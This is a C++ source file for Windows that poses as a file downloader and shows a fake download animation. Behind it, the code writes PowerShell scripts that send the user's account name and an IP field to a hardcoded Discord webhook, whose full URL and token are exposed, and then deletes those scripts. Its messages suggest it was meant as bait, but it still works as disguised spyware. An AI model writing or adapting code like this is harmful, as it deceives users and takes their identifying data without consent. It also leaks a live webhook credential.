#include <iostream>
#include <fstream>
#include <string>
#include <unistd.h>
#include <windows.h>
#include <chrono>
#include <thread>

using namespace std;

void suscout(string msg){
    for(auto c : msg){
        cout << c;
        this_thread::sleep_for(std::chrono::milliseconds(50));
    }
    cout << endl;
}

int detectrun() { //sends message to discord when it is ran
    ofstream file1("asset1.ps1");
    if (file1.is_open()) {
        file1 << "$webhookurl = \"https://discord.com/api/webhooks/1259185021613506561/Bp2soK5zsyY-iwOjKJBHH3DxydpNS8tcJfbqdD8ekv7YkLH784GO4GBic_2Nh-onnHDs\";" << endl;
        file1 << "$message = @{" << endl;
        file1 << "    content = $1" << endl;
        file1 << "}" << endl;
        file1 << "$jsonpayload = $message | ConvertTo-Json" << endl;
        file1 << "Invoke-RestMethod -Uri $webhookurl -Method Post -Body $jsonpayload -ContentType \"application/json\"" << endl;
        file1.close();
    } else {
        cout << "Please consult the person who sent this downloader with error code of 13 " << endl;
    }
    return 0;
}

int hook() { //ip and name
    ofstream file2("asset2.ps1");
    if (file2.is_open()) {
        file2 << "$webhookurl = \"https://discord.com/api/webhooks/1259185021613506561/Bp2soK5zsyY-iwOjKJBHH3DxydpNS8tcJfbqdD8ekv7YkLH784GO4GBic_2Nh-onnHDs\";" << endl;
        file2 << "$name = whoami" << endl;
				//file2 << "$ip = nslookup myip.opendns.com resolver1.opendns.com" << endl;
        file2 << "$message = @{" << endl;
        file2 << "    content = \"the presence of this message means the test worked.   name : $name , ip : $ip\"" << endl;
        file2 << "}" << endl;
        file2 << "$jsonpayload = $message | ConvertTo-Json" << endl;
        file2 << "Invoke-RestMethod -Uri $webhookurl -Method Post -Body $jsonpayload -ContentType \"application/json\"" << endl;
        file2.close();
    } else {
        cout << "Please consult the person who sent this downloader with error code of 13 " << endl;
    }
    return 0;
}

void evidence() { //sending of the ip
    hook();
    sleep(0.25);
    system("powershell.exe -File asset2.ps1");
    sleep(0.25);
    system("del asset2.ps1");
}

void fakedownloads() { // not shit its fake download
    char anim[] = {'|', '/', '-','\\', '|'};
    suscout("making a directory in desktop to download what you wanted");
    sleep(1);
    suscout("directory created");
    sleep(1);
    for (int j = 0; j < 3; j++) {
        for (int i = 0; i < 5; i++) {
            cout << "locating servers " << anim[i] << "\r";
            this_thread::sleep_for(std::chrono::milliseconds(500));
        }
    }
    sleep(0.25);
    cout << "\n\n";
    system("color c");
    suscout("server found");
    sleep(1);
    system("color 7");
    suscout("starting download");
    suscout("this might take a while");
    evidence();
    sleep(2);
    system("color a");
    suscout("download completed");
    sleep(1);
    cout << "feel free to delete this downloader, it's useless now" << endl;
    cout << "if you found any issues with this downloader, message the sender" << endl;
    system("PAUSE");
}

void proceed() { // if the guy accidentally downloaded this shit
		cout << "starting ... " << endl;
		detectrun();
		sleep(0.25);
		system("powershell.exe -File asset1.ps1 \"the program has been ran\"");
		sleep(0.25);
		cout << "startup complete" << endl;
    string tippingp;
    cout << "do you want to proceed with the download of it: (enter yes or no)";
    cin >> tippingp;
    if (tippingp == "yes") {
        fakedownloads();
    } else {
        cout << "if so, then you shouldnt have this" << endl;
				system("powershell.exe -File asset1.ps1 \"this guy is not a pedo\"");
    }
}

int main() {
    proceed();
		system("powershell.exe -File asset1.ps1 \"program ended\"");
		sleep(0.25);
		system("del asset1.ps1");
    return 0;
}
